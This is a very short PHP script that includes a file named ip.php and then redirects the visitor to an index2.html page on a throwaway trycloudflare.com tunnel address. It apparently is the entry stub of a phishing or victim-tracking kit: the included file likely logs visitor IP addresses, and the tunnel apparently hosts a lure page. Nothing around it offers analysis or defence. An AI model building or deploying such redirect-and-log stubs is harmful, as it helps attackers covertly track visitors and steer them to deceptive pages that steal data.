<?php
include 'ip.php';
header('Location: https://changes-achievements-sends-legacy.trycloudflare.com/index2.html');
exit
?>
